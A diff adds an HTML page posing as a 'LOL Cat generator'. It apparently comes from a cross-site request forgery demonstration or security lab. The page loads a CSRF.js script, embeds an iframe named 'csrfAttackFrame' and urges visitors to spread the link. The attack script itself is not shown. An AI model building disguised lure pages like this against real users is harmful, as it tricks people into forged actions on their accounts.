@@ -1,0 +1,25 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>LOL Cat generator</title>
+    <link href="Styles/site.css" rel="stylesheet" type="text/css" />
+    <script src="Scripts/jquery-1.4.1.min.js" type="text/javascript"></script>
+    <script src="Scripts/CSRF.js" type="text/javascript"></script>
+</head>
+<body>
+    <h1>
+        The best of LOL Catz</h1>
+    <p>
+        This page will show you a random cute picture of an animal with a funny caption.
+        Please forward its link to everyone on your email list and encourage them to do
+        the same.</p>
+    <p>
+        Click <a href="javascript:location.reload(true)">here</a> or your refresh button
+        to get a new picture.</p>
+    <div id='lolcatImageDiv' style='text-align: center; padding: 5em;'>
+        <img id='lolcatImage' />
+    </div>
+
+    <iframe id="csrfAttackFrame" style='width: 100%; height: 30em;'></iframe>
+</body>
+</html>
